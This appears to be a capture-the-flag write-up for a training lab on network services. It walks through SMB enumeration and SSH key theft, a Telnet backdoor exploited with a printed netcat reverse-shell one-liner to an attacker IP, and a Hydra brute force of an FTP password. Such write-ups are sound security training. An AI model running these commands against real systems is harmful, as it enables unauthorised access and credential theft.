> Network Services 1

## Exploiting SMB

# Nmap

nmap -sC -sV -T4 -Pn -vvv 10.10.190.160 -oN nmap/initial

```
22/tcp  open  ssh         syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
139/tcp open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn syn-ack Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: POLOSMB; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# enum4linux

enum4linux -a $IP

```
 ===================================================== 
|    Enumerating Workgroup/Domain on 10.10.190.160    |
 ===================================================== 
[+] Got domain/workgroup name: WORKGROUP

 ============================================= 
|    Nbtstat Information for 10.10.190.160    |
 ============================================= 
Looking up status of 10.10.190.160
	POLOSMB         <00> -         B <ACTIVE>  Workstation Service
	POLOSMB         <03> -         B <ACTIVE>  Messenger Service
	POLOSMB         <20> -         B <ACTIVE>  File Server Service
	..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
	WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
	WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
	WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

	MAC Address = 00-00-00-00-00-00

 ====================================== 
|    Session Check on 10.10.190.160    |
 ====================================== 
[+] Server 10.10.190.160 allows sessions using username '', password ''

 ============================================ 
|    Getting domain SID for 10.10.190.160    |
 ============================================ 
Domain Name: WORKGROUP
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup

 ======================================= 
|    OS information on 10.10.190.160    |
 ======================================= 
[+] Got OS info for 10.10.190.160 from smbclient: 
[+] Got OS info for 10.10.190.160 from srvinfo:
	POLOSMB        Wk Sv PrQ Unx NT SNT polosmb server (Samba, Ubuntu)
	platform_id     :	500
	os version      :	6.1
	server type     :	0x809a03

 ============================== 
|    Users on 10.10.190.160    |
 ============================== 


 ========================================== 
|    Share Enumeration on 10.10.190.160    |
 ========================================== 

	Sharename       Type      Comment
	---------       ----      -------
	netlogon        Disk      Network Logon Service
	profiles        Disk      Users profiles
	print$          Disk      Printer Drivers
	IPC$            IPC       IPC Service (polosmb server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available

[+] Attempting to map shares on 10.10.190.160
//10.10.190.160/netlogon	[E] Can't understand response:
tree connect failed: NT_STATUS_BAD_NETWORK_NAME
//10.10.190.160/profiles	Mapping: OK, Listing: OK
//10.10.190.160/print$	Mapping: DENIED, Listing: N/A
//10.10.190.160/IPC$	[E] Can't understand response:
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*

 ===================================================== 
|    Password Policy Information for 10.10.190.160    |
 ===================================================== 


[+] Attaching to 10.10.190.160 using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

	[+] POLOSMB
	[+] Builtin

[+] Password Info for Domain: POLOSMB

	[+] Minimum password length: 5
	[+] Password history length: None
	[+] Maximum password age: 37 days 6 hours 21 minutes 
	[+] Password Complexity Flags: 000000

		[+] Domain Refuse Password Change: 0
		[+] Domain Password Store Cleartext: 0
		[+] Domain Password Lockout Admins: 0
		[+] Domain Password No Clear Change: 0
		[+] Domain Password No Anon Change: 0
		[+] Domain Password Complex: 0

	[+] Minimum password age: None
	[+] Reset Account Lockout Counter: 30 minutes 
	[+] Locked Account Duration: 30 minutes 
	[+] Account Lockout Threshold: None
	[+] Forced Log off Time: 37 days 6 hours 21 minutes 


[+] Retieved partial password policy with rpcclient:

Password Complexity: Disabled
Minimum Password Length: 5


 =============================== 
|    Groups on 10.10.190.160    |
 =============================== 

[+] Getting builtin groups:

[+] Getting builtin group memberships:

[+] Getting local groups:

[+] Getting local group memberships:

[+] Getting domain groups:

[+] Getting domain group memberships:

 ======================================================================== 
|    Users on 10.10.190.160 via RID cycling (RIDS: 500-550,1000-1050)    |
 ======================================================================== 
[I] Found new SID: S-1-22-1
[I] Found new SID: S-1-5-21-434125608-3964652802-3194254534
[I] Found new SID: S-1-5-32
[+] Enumerating users using SID S-1-5-32 and logon username '', password ''
S-1-5-32-500 *unknown*\*unknown* (8)
S-1-5-32-501 *unknown*\*unknown* (8)
S-1-5-32-502 *unknown*\*unknown* (8)
S-1-5-32-503 *unknown*\*unknown* (8)
S-1-5-32-504 *unknown*\*unknown* (8)
S-1-5-32-505 *unknown*\*unknown* (8)
S-1-5-32-506 *unknown*\*unknown* (8)
S-1-5-32-507 *unknown*\*unknown* (8)
S-1-5-32-508 *unknown*\*unknown* (8)
S-1-5-32-509 *unknown*\*unknown* (8)
S-1-5-32-510 *unknown*\*unknown* (8)
S-1-5-32-511 *unknown*\*unknown* (8)
S-1-5-32-512 *unknown*\*unknown* (8)
S-1-5-32-513 *unknown*\*unknown* (8)
S-1-5-32-514 *unknown*\*unknown* (8)
S-1-5-32-515 *unknown*\*unknown* (8)
S-1-5-32-516 *unknown*\*unknown* (8)
S-1-5-32-517 *unknown*\*unknown* (8)
S-1-5-32-518 *unknown*\*unknown* (8)
S-1-5-32-519 *unknown*\*unknown* (8)
S-1-5-32-520 *unknown*\*unknown* (8)
S-1-5-32-521 *unknown*\*unknown* (8)
S-1-5-32-522 *unknown*\*unknown* (8)
S-1-5-32-523 *unknown*\*unknown* (8)
S-1-5-32-524 *unknown*\*unknown* (8)
S-1-5-32-525 *unknown*\*unknown* (8)
S-1-5-32-526 *unknown*\*unknown* (8)
S-1-5-32-527 *unknown*\*unknown* (8)
S-1-5-32-528 *unknown*\*unknown* (8)
S-1-5-32-529 *unknown*\*unknown* (8)
S-1-5-32-530 *unknown*\*unknown* (8)
S-1-5-32-531 *unknown*\*unknown* (8)
S-1-5-32-532 *unknown*\*unknown* (8)
S-1-5-32-533 *unknown*\*unknown* (8)
S-1-5-32-534 *unknown*\*unknown* (8)
S-1-5-32-535 *unknown*\*unknown* (8)
S-1-5-32-536 *unknown*\*unknown* (8)
S-1-5-32-537 *unknown*\*unknown* (8)
S-1-5-32-538 *unknown*\*unknown* (8)
S-1-5-32-539 *unknown*\*unknown* (8)
S-1-5-32-540 *unknown*\*unknown* (8)
S-1-5-32-541 *unknown*\*unknown* (8)
S-1-5-32-542 *unknown*\*unknown* (8)
S-1-5-32-543 *unknown*\*unknown* (8)
S-1-5-32-544 BUILTIN\Administrators (Local Group)
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)
S-1-5-32-1000 *unknown*\*unknown* (8)
S-1-5-32-1001 *unknown*\*unknown* (8)
S-1-5-32-1002 *unknown*\*unknown* (8)
S-1-5-32-1003 *unknown*\*unknown* (8)
S-1-5-32-1004 *unknown*\*unknown* (8)
S-1-5-32-1005 *unknown*\*unknown* (8)
S-1-5-32-1006 *unknown*\*unknown* (8)
S-1-5-32-1007 *unknown*\*unknown* (8)
S-1-5-32-1008 *unknown*\*unknown* (8)
S-1-5-32-1009 *unknown*\*unknown* (8)
S-1-5-32-1010 *unknown*\*unknown* (8)
S-1-5-32-1011 *unknown*\*unknown* (8)
S-1-5-32-1012 *unknown*\*unknown* (8)
S-1-5-32-1013 *unknown*\*unknown* (8)
S-1-5-32-1014 *unknown*\*unknown* (8)
S-1-5-32-1015 *unknown*\*unknown* (8)
S-1-5-32-1016 *unknown*\*unknown* (8)
S-1-5-32-1017 *unknown*\*unknown* (8)
S-1-5-32-1018 *unknown*\*unknown* (8)
S-1-5-32-1019 *unknown*\*unknown* (8)
S-1-5-32-1020 *unknown*\*unknown* (8)
S-1-5-32-1021 *unknown*\*unknown* (8)
S-1-5-32-1022 *unknown*\*unknown* (8)
S-1-5-32-1023 *unknown*\*unknown* (8)
S-1-5-32-1024 *unknown*\*unknown* (8)
S-1-5-32-1025 *unknown*\*unknown* (8)
S-1-5-32-1026 *unknown*\*unknown* (8)
S-1-5-32-1027 *unknown*\*unknown* (8)
S-1-5-32-1028 *unknown*\*unknown* (8)
S-1-5-32-1029 *unknown*\*unknown* (8)
S-1-5-32-1030 *unknown*\*unknown* (8)
S-1-5-32-1031 *unknown*\*unknown* (8)
S-1-5-32-1032 *unknown*\*unknown* (8)
S-1-5-32-1033 *unknown*\*unknown* (8)
S-1-5-32-1034 *unknown*\*unknown* (8)
S-1-5-32-1035 *unknown*\*unknown* (8)
S-1-5-32-1036 *unknown*\*unknown* (8)
S-1-5-32-1037 *unknown*\*unknown* (8)
S-1-5-32-1038 *unknown*\*unknown* (8)
S-1-5-32-1039 *unknown*\*unknown* (8)
S-1-5-32-1040 *unknown*\*unknown* (8)
S-1-5-32-1041 *unknown*\*unknown* (8)
S-1-5-32-1042 *unknown*\*unknown* (8)
S-1-5-32-1043 *unknown*\*unknown* (8)
S-1-5-32-1044 *unknown*\*unknown* (8)
S-1-5-32-1045 *unknown*\*unknown* (8)
S-1-5-32-1046 *unknown*\*unknown* (8)
S-1-5-32-1047 *unknown*\*unknown* (8)
S-1-5-32-1048 *unknown*\*unknown* (8)
S-1-5-32-1049 *unknown*\*unknown* (8)
S-1-5-32-1050 *unknown*\*unknown* (8)
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\cactus (Local User)
[+] Enumerating users using SID S-1-5-21-434125608-3964652802-3194254534 and logon username '', password ''
S-1-5-21-434125608-3964652802-3194254534-500 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-501 POLOSMB\nobody (Local User)
S-1-5-21-434125608-3964652802-3194254534-502 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-503 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-504 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-505 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-506 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-507 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-508 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-509 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-510 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-511 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-512 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-513 POLOSMB\None (Domain Group)
S-1-5-21-434125608-3964652802-3194254534-514 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-515 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-516 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-517 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-518 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-519 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-520 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-521 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-522 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-523 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-524 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-525 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-526 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-527 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-528 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-529 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-530 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-531 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-532 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-533 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-534 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-535 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-536 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-537 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-538 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-539 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-540 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-541 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-542 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-543 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-544 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-545 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-546 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-547 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-548 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-549 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-550 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1000 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1001 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1002 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1003 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1004 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1005 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1006 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1007 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1008 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1009 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1010 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1011 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1012 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1013 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1014 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1015 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1016 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1017 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1018 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1019 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1020 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1021 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1022 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1023 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1024 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1025 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1026 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1027 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1028 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1029 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1030 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1031 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1032 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1033 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1034 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1035 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1036 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1037 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1038 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1039 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1040 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1041 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1042 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1043 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1044 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1045 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1046 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1047 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1048 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1049 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1050 *unknown*\*unknown* (8)
```

# SMB

smbclient //$IP/profiles -U Anonymous

And we got a file `Working From Home Information.txt`

```
John Cactus,

As you're well aware, due to the current pandemic most of POLO inc. has insisted that, wherever 
possible, employees should work from home. As such- your account has now been enabled with ssh
access to the main server.

If there are any problems, please contact the IT department at it@polointernalcoms.uk

Regards,

James
Department Manager 
```

And we have .ssh directory. We have to get both `id_rsa` and `id_rsa.pub`. We can check `id_rsa.pub` to get the username. Let's try this to get a shell.

ssh -i id_rsa cactus@$IP

# smb.txt

```
THM{smb_is_fun_eh?}
```

## Exploiting Telnet

# Nmap

nmap -sC -sV -T4 -Pn -vvv 10.10.69.242 -oN nmap/initial

```
8012/tcp open  unknown syn-ack
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe: 
|_    SKIDY'S BACKDOOR. Type .HELP to view commands
```

> telnet $IP 8012

```
.HELP: View commands
 .RUN <command>: Execute commands
.EXIT: Exit
```

We can't see any output while running commands. Let's try ping and listenng through tcpdump.

```
SKIDY'S BACKDOOR. Type .HELP to view commands
.RUN ping 10.8.107.21 -c 5
```

And we got a hit. Let's craft a payload.

msfvenom -p cmd/unix/reverse_netcat lhost=10.8.107.21 lport=1234 R

```
Payload size: 101 bytes
mkfifo /tmp/paqyiek; nc 10.8.107.21 1234 0</tmp/paqyiek | /bin/sh >/tmp/paqyiek 2>&1; rm /tmp/paqyiek
```

And we got a shell as root!!

# flag.txt

```
THM{y0u_g0t_th3_t3ln3t_fl4g}
```

## Exploiting FTP

# Nmap

nmap -sC -sV -T4 -Pn -p- -vvv 10.10.177.194

```

```

# Anonymous FTP Login allowed

```
PUBLIC_NOTICE.txt 
===================================
MESSAGE FROM SYSTEM ADMINISTRATORS
===================================

Hello,

I hope everyone is aware that the
FTP server will not be available 
over the weekend- we will be 
carrying out routine system 
maintenance. Backups will be
made to my account so I reccomend
encrypting any sensitive data.

Cheers,

Mike 
```

# Cracking password with Hydra

hydra -l mike -P /usr/share/wordlists/rockyou.txt 10.10.177.194 ftp

```
[21][ftp] host: 10.10.177.194   login: mike   password: password
```

# ftp.txt

```
THM{y0u_g0t_th3_ftp_fl4g}
```

# Reference

https://www.jscape.com/blog/bid/91906/Countering-Packet-Sniffers-Using-Encrypted-FTP